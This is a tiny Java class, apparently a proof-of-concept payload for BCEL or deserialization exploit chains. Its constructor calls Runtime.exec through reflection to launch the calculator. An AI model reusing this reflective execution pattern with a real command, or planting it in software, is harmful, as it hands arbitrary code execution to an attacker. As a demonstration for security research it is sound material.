package Javac;

public class Hello_BCEL
{
    public Hello_BCEL()throws Exception
    {
        Class<?> c= Class.forName("java.lang.Runtime");
        c.getMethod("exec", String.class).invoke(c.getMethod("getRuntime").invoke(c), "calc");
    }
}
